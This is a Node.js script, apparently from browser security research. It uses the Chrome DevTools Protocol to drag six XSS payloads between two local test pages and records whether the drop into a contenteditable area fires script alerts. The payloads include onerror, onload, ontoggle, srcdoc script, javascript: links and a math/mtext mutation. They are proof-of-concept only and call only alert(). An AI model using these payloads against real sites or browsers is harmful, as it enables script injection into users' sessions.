// Attempt 2: battery of active-content payloads through the default contenteditable drop path
const CDP_PORT = 9222;
const SOURCE_URL = 'http://127.0.0.1:8000/dragme.html';
const TARGET_URL = 'http://127.0.0.1:8001/dropme.html';
class CDP {
  constructor(ws) { this.ws = ws; this.id = 0; this.pending = new Map(); this.events = []; }
  static async connect(wsUrl) {
    const ws = new WebSocket(wsUrl);
    await new Promise((res, rej) => { ws.onopen = res; ws.onerror = rej; });
    const c = new CDP(ws);
    ws.onmessage = (ev) => {
      const msg = JSON.parse(typeof ev.data === 'string' ? ev.data : ev.data.toString());
      if (msg.id && c.pending.has(msg.id)) {
        const { res, rej } = c.pending.get(msg.id);
        c.pending.delete(msg.id);
        msg.error ? rej(new Error(JSON.stringify(msg.error))) : res(msg.result);
      } else if (msg.method) c.events.push(msg);
    };
    return c;
  }
  send(method, params = {}) {
    const id = ++this.id;
    return new Promise((res, rej) => {
      this.pending.set(id, { res, rej });
      this.ws.send(JSON.stringify({ id, method, params }));
    });
  }
  waitEvent(method, timeoutMs) {
    return new Promise((res, rej) => {
      const t0 = Date.now();
      const tick = () => {
        const i = this.events.findIndex(e => e.method === method);
        if (i >= 0) return res(this.events.splice(i, 1)[0]);
        if (Date.now() - t0 > timeoutMs) return rej(new Error('timeout ' + method));
        setTimeout(tick, 50);
      };
      tick();
    });
  }
  async evaluate(expr) {
    const r = await this.send('Runtime.evaluate', { expression: expr, returnByValue: true, awaitPromise: true });
    if (r.exceptionDetails) throw new Error('eval exception: ' + JSON.stringify(r.exceptionDetails.exception && r.exceptionDetails.exception.description));
    return r.result.value;
  }
  close() { try { this.ws.close(); } catch (e) {} }
}
async function getTargets() { return (await fetch('http://127.0.0.1:' + CDP_PORT + '/json/list')).json(); }
const sleep = ms => new Promise(r => setTimeout(r, ms));

const PAYLOADS = [
  '<img src="x" onerror="alert(1)">',
  '<svg onload="alert(2)"></svg>',
  '<iframe srcdoc="<script>alert(3)<\/script>"></iframe>',
  '<a href="javascript:alert(4)">link</a>',
  '<details open ontoggle="alert(5)"><summary>s</summary></details>',
  '<math><mtext><img src=x onerror=alert(6)></mtext></math>'
];

async function main() {
  const targets = await getTargets();
  const srcT = targets.find(t => t.url === SOURCE_URL);
  const dstT = targets.find(t => t.url === TARGET_URL);
  const src = await CDP.connect(srcT.webSocketDebuggerUrl);
  const dst = await CDP.connect(dstT.webSocketDebuggerUrl);
  await src.send('Page.enable'); await src.send('Runtime.enable');
  await dst.send('Page.enable'); await dst.send('Runtime.enable');

  const dstC = await dst.evaluate(`(() => { const r = document.getElementById('dropzone').getBoundingClientRect(); return {x:Math.round(r.x+r.width/2), y:Math.round(r.y+r.height/2)}; })()`);

  for (let i = 0; i < PAYLOADS.length; i++) {
    // reset dropzone
    await dst.evaluate(`document.getElementById('dropzone').innerHTML = 'reset'`);
    const payload = PAYLOADS[i];
    // source page dragstart sets this payload
    await src.evaluate(`(() => {
      const el = document.getElementById('draggable');
      const dt = new DataTransfer();
      const ev = new DragEvent('dragstart', { bubbles: true, cancelable: true, dataTransfer: dt });
      el._payload = ${JSON.stringify(payload)};
      // override handler behavior via custom dispatch: use a fresh handler-less approach
      const ev2 = new DragEvent('dragstart', { bubbles: true, cancelable: true, dataTransfer: dt });
      el.dispatchEvent(ev2);
      window.__dt = dt;
      window.__payload = ${JSON.stringify(payload)};
    })()`);
    // Rebuild dragData with our payload (we control the drag content; sanitization happens at drop insertion)
    const dragData = {
      items: [
        { mimeType: 'text/html', data: payload },
        { mimeType: 'text/plain', data: 'hello' }
      ],
      files: [],
      dragOperationsMask: 1
    };
    await dst.send('Input.dispatchDragEvent', { type: 'dragEnter', x: dstC.x, y: dstC.y, data: dragData });
    await dst.send('Input.dispatchDragEvent', { type: 'dragOver', x: dstC.x, y: dstC.y, data: dragData, dragOperationsMask: 1 });
    await dst.send('Input.dispatchDragEvent', { type: 'drop', x: dstC.x, y: dstC.y, data: dragData, dragOperationsMask: 1 });
    await sleep(300);
    let dialog = null;
    try {
      const ev = await dst.waitEvent('Page.javascriptDialogOpening', 1200);
      dialog = ev.params.message;
      await dst.send('Page.handleJavaScriptDialog', { accept: true });
    } catch (e) { /* no dialog */ }
    const inner = await dst.evaluate(`document.getElementById('dropzone').innerHTML`);
    console.log('PAYLOAD[' + i + ']=' + JSON.stringify(payload));
    console.log('  dialog=' + JSON.stringify(dialog));
    console.log('  innerHTML_after_drop=' + JSON.stringify(inner));
  }
  src.close(); dst.close();
  process.exit(0);
}
main().catch(e => { console.error('DRIVER_ERROR ' + e.message); process.exit(1); });
